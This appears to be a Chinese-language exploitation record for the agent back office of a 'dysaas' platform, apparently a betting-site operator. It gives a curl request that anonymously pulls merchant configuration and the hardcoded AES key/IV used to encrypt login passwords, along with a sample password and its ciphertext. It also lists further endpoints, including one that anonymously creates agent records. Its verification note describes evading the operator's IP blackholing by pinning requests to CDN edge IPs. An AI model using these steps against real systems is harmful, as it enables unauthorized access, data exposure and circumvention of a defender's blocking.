# dysaas 代理后台 API 前缀双写规律 + 匿名 clientCode 商户配置泄露

- **code**: dysaas-代理后台-api-前缀双写规律-匿名-clientcode-商户配置泄露
- **kind**: poc
- **category**: unauthorized
- **component**: dysaas 代理后台（代理后台 SPA · agentPlate）
- **severity**: medium
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-08 复核与修正（exploit 角色）：
① **源站 203.0.113.86 已对我方全部出口 L4 黑洞**（443/80/9960/22 TCP 与 TLS 握手全超时，直连出口 203.0.113.47 与代理出口 203.0.113.53 都一样）——本条 POC 记的「源站 203.0.113.86:443」现在打不通。
② 恢复通道：example.com → CNAME letebeto.ccname.org，是极星云 CDN 轮询解析；穷举 A/AAAA 得 9 个边缘 IP，其中 **203.0.113.48:443 与 203.0.113.93:443 仍放行**，固定 SNI+Host=example.com 即可复活。同一批边缘也反代 example.com（/xxa 网关）。
③ 匿名 clientCode 实测仍为 200，且用 Accept: application/vnd.dysaas.v1+json 拿到代理后台侧数据（id=70 / 6T体育 / userPrefix=ffty / operator=xinron / clientFolder=fftya041 / agentDomain 10 个代理域名）。不加该 Accept 头会路由到平台侧、返回另一套 clientCode。
④ **口令加密修正**：代理后台入口 bundle /js/app.37e6de38.js 里唯一加密函数是 CryptoJS.AES.encrypt(Utf8.parse(t), Utf8.parse('pigxpigxpigxpigx'), {iv: Utf8.parse('pigxpigxpigxpigx'), mode: CBC, padding: Pkcs7}) + Base64.stringify(ciphertext)，即 AES-CBC + **Pkcs7** + key=iv=pigxpigxpigxpigx；encrypt("Sr960823") = **2w1KjdndZSyRb8h0Mt3GTQ==**（原记录的 Ud7KEC4K4Kk6x47kBZa3BA== 是零填充的结果，不是本算法输出）。
⑤ 代理后台 Authorization 用**裸 token（无 Bearer 前缀）**；裸 token 打受保护接口返回 200 {"code":16003}（token 无效），带 Bearer 则 401。
⑥ 新增：SPA 懒加载 chunk（/js/chunk-<8hex>.<8hex>.js，共 24 个）里有入口 bundle 不含的接口 —— /agent/api/v1/parentAgent/{list,apply,add,checkUserName,del}、agentPlate/listBankInfo、agent/api/banks/*、/agent/api/v1/file/upload（multipart，字段 file，需代理会话）、game/api/v1/export/fileLog 等；**全量拉 chunk 才能看全接口面**。
⑦ 新增同类匿名接口：主站 /xxa/agent/api/v1/agent/appSave（体 {"param":{...}}，匿名返回 code=0 成功，可创建代理申请记录；账号需人工开通，登录不通）。
- **tags**: 代理后台,未授权,路径前缀双写,信息泄露,dysaas,AES
- **created_at**: 2026-10-08T13:29:01.330Z
- **found_by**: exploit

## 描述

该平台家族「代理后台」Vue SPA 的 API 路径特征：前端 apiBaseURL=「/agent」，而各接口 url 自身已以「agent/api/v1/」开头，导致**实际请求路径前缀双写**为 /agent/agent/api/v1/...（写成单前缀会 404 回落 SPA example.com）。鉴权方式：cookie 内的 token 作为 Authorization 头；请求体统一包一层 {param:...}；Accept: application/vnd.dysaas.v1+json。匿名豁免白名单只有 agentPlate/clientCode 与 validateCode/getDefaultStatus，clientCode 未授权即返回商户配置。登录 agentPlate/login 无验证码，口令按前端 AES(key=iv="pigxpigxpigxpigx", CBC, Pkcs7) 加密。

## 用法

```
匿名取商户配置（无需任何凭据）：
curl -k -x http://127.0.0.1:7892 --resolve example.com:443:<ORIGIN_IP> \
  -H "Accept: application/vnd.dysaas.v1+json" -H "Content-Type: application/json" \
  -H "clientCode: ffty" \
  -d '{"param":{}}' \
  https://example.com/agent/agent/api/v1/agentPlate/clientCode

批量探测：python runs\agent_api_probe2.py
口令加密（Python）：AES-CBC(key=iv=b'pigxpigxpigxpigx') + Pkcs7 + base64
```
